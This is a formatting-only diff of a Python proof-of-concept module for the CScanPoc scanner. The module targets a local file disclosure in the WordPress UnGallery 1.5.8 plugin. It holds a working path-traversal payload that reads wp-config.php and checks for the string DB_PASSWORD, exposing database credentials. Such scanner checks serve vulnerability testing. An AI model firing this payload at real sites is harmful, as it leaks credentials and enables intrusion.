@@ -1,21 +1,22 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0077' # 平台漏洞编号，留空
-    name = 'WordPress Plugin UnGallery 1.5.8 - Local File Disclosure' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
+    vuln_id = 'WordPress_0077'  # 平台漏洞编号，留空
+    name = 'WordPress Plugin UnGallery 1.5.8 - Local File Disclosure'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.LFI  # 漏洞类型
     disclosure_date = '2011-08-20'  # 漏洞公布时间
     desc = '''
         WordPress Plugin UnGallery 1.5.8 - Local File Disclosure
-    ''' # 漏洞描述
-    ref = 'https://www.exploit-db.com/exploits/17704/' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'https://www.exploit-db.com/exploits/17704/'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress Plugin UnGallery 1.5.8'  # 漏洞应用版本
 
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'd8c688e4-8b12-416d-8adc-d2ea2f1ffbaf'
     author = '国光'  # POC编写者
-    create_date = '2018-05-15' # POC创建时间
+    create_date = '2018-05-15'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -35,9 +36,10 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload = '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php'
             verify_url = arg + payload
-            code, head, content, errcode,finalurl = hh.http(verify_url)
-            if code==200 and 'DB_PASSWORD' in content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+            code, head, content, errcode, finalurl = hh.http(verify_url)
+            if code == 200 and 'DB_PASSWORD' in content:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
